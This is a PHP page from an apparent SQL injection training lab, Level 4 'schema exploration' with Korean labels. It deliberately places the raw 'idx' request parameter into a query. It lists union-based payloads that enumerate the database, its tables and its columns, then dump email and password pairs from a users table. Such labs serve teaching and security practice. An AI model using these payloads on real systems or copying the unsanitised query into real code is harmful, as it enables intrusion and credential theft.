<?php require __DIR__.'/_lib.php'; page_header('Level 4 — 스키마 탐색');
$db=ladder_db(); $idx=$_GET['idx']??'0 union select 1,2,3,database(),5,6,7,8';
$sql="select * from freeboard where idx={$idx}";
$result=lab_query($db,$sql,__FILE__,__LINE__,['level'=>'4','note'=>'schema recon']); ?>
<h1>Level 4 — 스키마 탐색 (information_schema)</h1>
<div class="box goal"><b>목표</b>: <code>database()</code> → 테이블 → 컬럼을 단계적으로. <code>limit</code>, <code>concat</code>, <code>group_concat</code>.</div>
<div class="box"><form method="GET">idx = <input name="idx" value="<?=h($idx)?>" size="80"> <button>조회</button></form>
<ul style="font-size:.82rem">
<li><code>0 union select 1,2,3,database(),5,6,7,8</code></li>
<li><code>0 union select 1,2,3,group_concat(table_name),5,6,7,8 from information_schema.tables where table_schema=database()</code></li>
<li><code>0 union select 1,2,3,group_concat(column_name),5,6,7,8 from information_schema.columns where table_schema=database() and table_name='users'</code></li>
<li><code>0 union select 1,2,3,group_concat(concat(email,0x3a,password)),5,6,7,8 from users</code></li>
</ul></div>
<?php show_sql($sql); show_error($result===false?mysqli_error($db):null); show_result($result); page_footer(); ?>
